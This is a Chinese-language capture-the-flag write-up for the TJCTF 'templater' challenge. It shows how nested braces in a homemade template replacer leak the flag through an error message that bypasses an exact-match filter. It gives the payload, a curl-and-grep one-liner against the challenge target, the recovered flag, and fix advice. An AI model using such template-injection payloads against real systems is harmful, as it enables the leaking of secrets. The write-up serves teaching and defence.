# templater

## 题目简述

应用自制了一个 `{{key}}` 替换器，内置 `flag` 键。替换完成后，如果完整 flag 出现在结果字符串中就返回 403。问题在于嵌套花括号会触发第二轮解析；第二轮产生的“未知键”错误会包含几乎完整的 flag，却缺少最后一个 `}`，从而绕过精确子串检查。

## 解题过程

`template()` 每轮用正则找一个 `{{...}}`，取中间内容作为键并做全局替换。提交四个左花括号、三个右花括号：

```text
{{{{flag}}}
```

第一轮匹配内层 `{{flag}}` 并替换为真实 flag。假设 flag 是 `tjctf{...}`，中间结果变成：

```text
{{tjctf{...}}
```

第二轮把外层内容 `tjctf{...` 当作键；因为去掉两侧 `{{`、`}}` 时，flag 自身最后的 `}` 也成为模板闭合符的一部分，所以错误信息只泄漏到最后一个花括号之前：

```text
Key tjctf{... not found!
```

路由检查的是完整 `flag in s[0]`，缺少 `}` 的错误字符串不会命中。请求并补回固定结尾即可：

```bash
body=$(curl -s -X POST -d 'template={{{{flag}}}' 'https://TARGET/template')
printf '%s}\n' "$(printf '%s' "$body" | grep -o 'tjctf{[A-Za-z0-9_]*')"
```

得到：

```text
tjctf{t3mpl4t3r_1_h4rdly_kn0w_h3r_bf644616}
```

## 方法总结

- 自制模板替换器同样会有解析歧义；嵌套定界符使秘密跨越“值”和“下一轮键名”两个语义层。
- 事后用完整秘密做字符串过滤很脆弱，攻击者只需制造部分泄漏，再补上已知格式字符。
- 修复应禁止读取敏感模板键，使用成熟的单次模板渲染，并让错误信息只返回固定消息，不能回显攻击者控制且可能含秘密的键名。
